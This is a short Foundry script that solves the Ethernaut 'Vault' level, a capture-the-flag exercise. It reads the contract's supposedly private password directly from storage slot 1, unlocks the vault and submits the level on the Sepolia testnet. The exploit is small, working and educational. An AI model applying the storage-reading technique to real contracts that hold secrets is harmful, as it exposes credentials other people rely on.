// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {Vault} from "../src/Level08.sol";

contract Level08 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address caller = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        Vault instance = Vault(vm.envAddress("LVL08_ADDR"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        bytes32 pass = vm.load(address(instance), bytes32(uint256(1)));

        instance.unlock(pass);

        bool locked = instance.locked();
        console2.log("locked: ", locked);

        if (locked) {
            console2.log("call failed");
        } else ethernaut.submitLevelInstance(address(instance));

        vm.stopBroadcast();
    }
}

// forge script script/Level08.s.sol --broadcast --rpc-url sepolia
